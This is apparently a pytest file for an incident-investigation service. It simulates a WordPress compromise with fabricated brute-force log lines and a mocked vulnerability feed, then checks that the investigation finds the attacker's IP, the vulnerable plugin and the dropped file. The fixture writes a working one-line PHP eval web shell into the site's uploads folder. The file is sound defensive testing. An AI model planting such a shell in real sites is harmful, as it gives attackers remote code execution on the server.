"""Entry-point investigation on a realistic break-in: brute-forced login, a plugin request, a web shell dropped in
uploads and then used. The investigation must find the file, the attacker's address, the login and the plugin,
flag outdated/vulnerable software, and stay limited to the engineer holding the access grant."""

from __future__ import annotations

import os
import socket
from datetime import timedelta

import httpx
import pytest

from app.core.config import get_settings
from app.core.http import set_transport_factory
from app.db.base import utcnow
from app.db.session import platform_session
from app.services import investigation
from tests.conftest import run_dispatched
from tests.test_monitoring_flow import _scan, _website
from tests.test_remediation import FakeWordPressWithFiles
from tests.test_security import _staff
from tests.test_vendor import wp_site  # noqa: F401 - fixture

ATTACKER = "203.0.113.66"
SHELL = "wp-content/uploads/2026/11/cache.php"


class FakeWorld(FakeWordPressWithFiles):
    def handler(self, request: httpx.Request) -> httpx.Response:
        host, path = request.headers["host"], request.url.path
        if host == "api.wordpress.org" and path == "/core/version-check/1.7/":
            return httpx.Response(200, json={"offers": [{"current": "6.8.0"}]})
        if host == "api.wordpress.org" and path == "/plugins/info/1.2/":
            return httpx.Response(200, json={"version": "1.7.3"})
        if host == "www.wordfence.com":
            assert request.headers["authorization"] == "Bearer wf-test-key"
            return httpx.Response(200, json={"vuln-1": {
                "title": "Hello Dolly <= 1.7.2 - Unauthenticated Arbitrary File Upload", "cve": "CVE-2026-0001",
                "cvss": {"score": 9.8, "rating": "Critical"}, "references": ["https://example.org/advisory"],
                "software": [{"type": "plugin", "slug": "hello-dolly", "patched_versions": ["1.7.3"],
                              "affected_versions": {"* - 1.7.2": {"from_version": "*", "from_inclusive": True,
                                                                   "to_version": "1.7.2", "to_inclusive": True}}}]}})
        return super().handler(request)


@pytest.fixture
def world(monkeypatch):
    fake = FakeWorld()
    real = socket.getaddrinfo
    hosts = ("api.wordpress.org", "downloads.wordpress.org", "www.wordfence.com")

    def resolve(host, port, *a, **k):
        if host in hosts:
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("198.143.164.251", port))]
        return real(host, port, *a, **k)

    monkeypatch.setattr(socket, "getaddrinfo", resolve)
    monkeypatch.setattr(get_settings(), "vendor_checksums_enabled", True)
    monkeypatch.setattr(get_settings(), "wordfence_api_key", "wf-test-key")
    set_transport_factory(lambda: httpx.MockTransport(fake.handler))
    yield fake
    set_transport_factory(None)


def _line(ip, at, method, path, status, agent="Mozilla/5.0"):
    return f'{ip} - - [{at:%d/%b/%Y:%H:%M:%S} +0000] "{method} {path} HTTP/1.1" {status} 512 "-" "{agent}"\n'


@pytest.fixture
def breached(alice, sftp_server, sftp_root, wp_site, world, monkeypatch):  # noqa: F811
    sess, tid = alice
    r = sess.post(f"/api/v1/tenants/{tid}/hosting-accounts", json={
        "name": "Hosting", "connector_type": "sftp", "hostname": "127.0.0.1", "port": sftp_server.port,
        "username": sftp_server.state.username, "root_path": "/public_html", "log_paths": ["/access-logs"],
        "credential": {"kind": "password", "value": sftp_server.state.password}})
    assert r.status_code == 201, r.text
    run_dispatched()
    acct = r.json()["id"]
    wid = _website(sess, tid, acct)
    assert _scan(sess, tid, wid) == ["succeeded"]

    t = (utcnow() - timedelta(hours=2)).replace(microsecond=0)
    shell = wp_site / SHELL
    shell.parent.mkdir(parents=True, exist_ok=True)
    shell.write_text("<?php @eval($_POST['x']);\n")
    os.utime(shell, (t.timestamp(), t.timestamp()))
    lines = [_line("198.51.100.7", t - timedelta(hours=1, minutes=m), "GET", "/", 200) for m in range(5)]
    lines += [_line(ATTACKER, t - timedelta(minutes=20, seconds=-s), "POST", "/wp-login.php", 200, "python-requests")
              for s in range(25)]
    lines.append(_line(ATTACKER, t - timedelta(minutes=10), "POST", "/wp-login.php", 302, "python-requests"))
    lines.append(_line(ATTACKER, t - timedelta(minutes=1), "POST", "/wp-content/plugins/hello-dolly/upload.php", 200))
    lines.append(_line(ATTACKER, t + timedelta(minutes=2), "POST", "/" + SHELL, 200))
    lines.append(_line("198.51.100.7", t + timedelta(minutes=3), "GET", "/about/", 200))
    logs_dir = sftp_root / "access-logs"
    logs_dir.mkdir()
    (logs_dir / "www.alpha-site.com-ssl_log").write_text("".join(lines))
    assert _scan(sess, tid, wid) == ["succeeded"]

    ticket = sess.post(f"/api/v1/tenants/{tid}/tickets", json={"subject": "Hacked", "category": "malware_cleanup",
                                                               "body": "x", "website_id": wid}).json()
    eng = _staff("investigator@trustdata.example.com", ["support_agent"])
    eng.post(f"/api/v1/ops/service-desk/{ticket['id']}/assign", json={})
    sess.post(f"/api/v1/tenants/{tid}/tickets/{ticket['id']}/remediation-approval",
              json={"scope": "Investigate and clean the site.", "confirm": True})

    def run_now(inv_id):
        with platform_session() as db:
            investigation.run(db, inv_id)
            db.commit()

    monkeypatch.setattr(investigation, "dispatch", run_now)
    return {"eng": eng, "ticket": ticket["id"], "t": t}


def test_investigation_reconstructs_the_break_in(breached):
    eng, tid_ = breached["eng"], breached["ticket"]
    r = eng.post(f"/api/v1/ops/service-desk/{tid_}/investigations")
    assert r.status_code == 202, r.text
    got = eng.get(f"/api/v1/ops/service-desk/{tid_}/investigations/latest").json()
    inv = got["investigation"]
    assert got["allowed"] and inv["status"] == "done", inv
    res = inv["result"]

    pivot = next(p for p in res["pivots"] if p["path"] == SHELL)
    assert pivot["time_source"] == "file modification time" and pivot["logs_cover_time"]
    assert [u["ip"] for u in pivot["used_by"]] == [ATTACKER]
    assert any(w["path"].endswith("/hello-dolly/upload.php") and w["attacker_ip"] for w in pivot["window"])

    kinds = {(h["kind"], h["confidence"]) for h in res["hypotheses"]}
    assert ("password", "high") in kinds, res["hypotheses"]
    assert ("plugin", "high") in kinds
    plugin = next(h for h in res["hypotheses"] if h["kind"] == "plugin")
    assert "hello-dolly" in plugin["title"] and "known vulnerabilities" in plugin["detail"]

    ip = next(a for a in res["attacker_ips"] if a["ip"] == ATTACKER)
    assert ip["logins"] == 26 and ip["first_requests"][0]["path"] == "/wp-login.php"

    sw = {s["slug"]: s for s in res["software"]}
    assert sw["wordpress"]["outdated"] and sw["wordpress"]["latest"] == "6.8.0"
    assert sw["hello-dolly"]["outdated"] and sw["hello-dolly"]["vulnerabilities"][0]["cve"] == "CVE-2026-0001"
    assert "How the attacker most likely got in" in inv["report_text"] and ATTACKER in inv["report_text"]


def test_investigation_needs_the_assigned_engineer_with_a_grant(breached):
    other = _staff("other-inv@trustdata.example.com", ["soc_analyst"])
    r = other.post(f"/api/v1/ops/service-desk/{breached['ticket']}/investigations")
    assert r.status_code == 422 and "investigate the site" in r.json()["error"]["message"]
    assert other.get(f"/api/v1/ops/service-desk/{breached['ticket']}/investigations/latest").json() == {
        "investigation": None, "allowed": False}


def test_version_ranges():
    from app.services.investigation import _affected

    assert _affected("1.7.2", [{"from_version": "*", "to_version": "1.7.2", "to_inclusive": True}])
    assert not _affected("1.7.3", [{"from_version": "*", "to_version": "1.7.2", "to_inclusive": True}])
    assert not _affected("1.7.2", [{"from_version": "*", "to_version": "1.7.2", "to_inclusive": False}])
    assert _affected("2.0", [{"from_version": "1.5", "from_inclusive": True, "to_version": "2.1", "to_inclusive": False}])
    assert not _affected("1.10", [{"from_version": "*", "to_version": "1.9", "to_inclusive": True}]), "1.10 > 1.9"
